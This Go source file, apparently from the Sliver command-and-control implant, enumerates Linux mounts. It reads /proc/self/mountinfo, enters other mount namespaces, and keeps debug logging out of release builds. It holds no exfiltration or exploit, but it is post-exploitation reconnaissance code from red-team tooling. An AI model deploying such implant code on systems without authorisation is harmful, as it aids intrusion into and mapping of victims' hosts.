// +linux

package mount

import (
	// {{if .Config.Debug}}

	"log"

	// {{end}}

	"bufio"
	"os"
	"runtime"
	"strings"
	"syscall"

	"github.com/bishopfox/sliver/implant/sliver/namespaces"
	"github.com/bishopfox/sliver/protobuf/sliverpb"

	"golang.org/x/sys/unix"
)

func GetMountInformation() ([]*sliverpb.MountInfo, error) {
	mountFilename := "/proc/self/mountinfo"
	mountInfo := make([]*sliverpb.MountInfo, 0)

	fileMountInfo, err := parseMountFile(mountFilename, mountInfo)
	if err != nil {
		//{{if .Config.Debug}}
		log.Printf("error getting host mount information: %v", err)
		//{{end}}
	} else {
		mountInfo = append(mountInfo, fileMountInfo...)
	}

	// Get namespace mount data
	namespacesFound, err := namespaces.GetUniqueNamespaces(namespaces.NetworkNamespace)

	if err != nil {
		//{{if .Config.Debug}}
		log.Printf("error getting namespaces: %v", err)
		//{{end}}
		return mountInfo, nil
	}

	// Lock the OS Thread so we don't accidentally switch namespaces
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	origns, err := namespaces.GetOriginNsFd(namespaces.MountNamespace)

	if err != nil {
		return mountInfo, nil
	}

	// We only need to use the path value
	for _, nsPath := range namespacesFound {
		nsFd, err := unix.Open(nsPath, unix.O_RDONLY|unix.O_CLOEXEC, 0)
		if err != nil {
			continue
		}

		// Ignore original namespace to avoid duplicate interfaces
		if namespaces.GetUniqueFd(nsFd) == namespaces.GetUniqueFd(origns) {
			continue
		}

		err = namespaces.EnterNs(nsFd, namespaces.MountNamespace)
		if err != nil {
			continue
		}

		nsMountInfo, err := parseMountFile(mountFilename, mountInfo)

		if err != nil {
			//{{if .Config.Debug}}
			log.Printf("error getting namespace mount information: %v", err)
			//{{end}}
			continue
		}
		mountInfo = append(mountInfo, nsMountInfo...)
	}

	// Switch back to the original namespace
	_ = namespaces.EnterNs(origns, namespaces.MountNamespace)

	return mountInfo, nil
}

func parseMountFile(mountFilename string, mountInfo []*sliverpb.MountInfo) ([]*sliverpb.MountInfo, error) {
	fileMountInfo := make([]*sliverpb.MountInfo, 0)

	file, err := os.Open(mountFilename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()
		fields := strings.Fields(line)

		// Extract fields according to the /proc/self/mountinfo format
		// https://man7.org/linux/man-pages/man5/proc.5.html
		mountRoot := fields[3]
		mountPoint := fields[4]
		mountOptions := fields[5]
		mountType := fields[len(fields)-3]
		mountSource := fields[len(fields)-2]

		// Get mount information using statfs
		var stat syscall.Statfs_t
		err := syscall.Statfs(mountPoint, &stat)
		if err != nil {
			continue
		}

		var mountData sliverpb.MountInfo

		mountData.Label = mountRoot
		mountData.MountPoint = mountPoint
		mountData.VolumeType = mountType
		mountData.VolumeName = mountSource
		mountData.MountOptions = mountOptions
		mountData.TotalSpace = stat.Blocks * uint64(stat.Bsize)

		fileMountInfo = append(fileMountInfo, &mountData)
	}

	return fileMountInfo, nil
}
